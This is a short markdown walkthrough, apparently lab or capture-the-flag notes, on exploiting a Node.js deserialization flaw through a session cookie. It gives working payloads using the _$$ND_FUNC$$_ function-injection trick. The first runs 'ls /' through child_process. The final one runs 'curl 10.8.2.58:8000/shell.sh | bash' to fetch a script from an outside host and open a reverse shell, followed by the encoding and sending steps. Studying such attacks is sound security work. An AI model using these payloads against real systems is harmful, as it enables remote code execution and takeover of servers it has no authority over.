# Javascript Vulnerabilities
## Javascript Deserializaiton
- Notice the assigned session cookie
- ![alt text](https://miro.medium.com/max/2400/1*ewfMSwChAJIydTBUx9gOCw.png)
- Attempt to decode the cookie in the `decoder` tab
- ![alt text](https://miro.medium.com/max/2400/1*_XIvf6iVoSmg026Ls7fLyQ.png)
- Attempt to modify the cookie by either
````
Cut the cookie in half to see if you can create a server error
Change the cookies values as seen below
````
- ![alt text](https://miro.medium.com/max/2400/1*-O0ze1yZRIpR9WQ1puhE0g.png)
- ![alt text](https://miro.medium.com/max/2400/1*aPfPEful30HcpOB1aj6FEA.png)
- When we cut the cookie in half we get a server error 
- ![Screenshot 2021-08-20 082329](https://user-images.githubusercontent.com/75596877/130232573-bc6fec6d-23a5-4e57-8e1e-e950e4c377df.png)
- We see that the web application is trying to unserialize the session cookie but it’s getting an error.
- Node Js de-serialization vulnerability is the easiest to exploit since the payload doesn’t change that much
- ![alt text](https://miro.medium.com/max/2400/1*7CG1m4g4Sog0f3KGB9hWrA.png)
- We will modify the following payload a bit to get it working
````
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
````
- Encode the cookie and see if that payload works to get command injection
- ![alt text](https://miro.medium.com/max/2400/1*V90bBMrFvszV9S-o99P5tQ.png)
- Create a reverse shell script and make sure to `chmod +x` the script
- Final Payload
````
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.8.2.58:8000/shell.sh | bash ', function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}
````
- Start your listener
- Encode the payload to `Base64` and then `URL Encode`
- ![alt text](https://miro.medium.com/max/2400/1*mQMiB6s96Inix_0O12lGEQ.png)
- ![alt text](https://miro.medium.com/max/2400/1*G8JcV1V1338iuPhrr2x3rg.png)
- Send the request, and get a rev shell!















































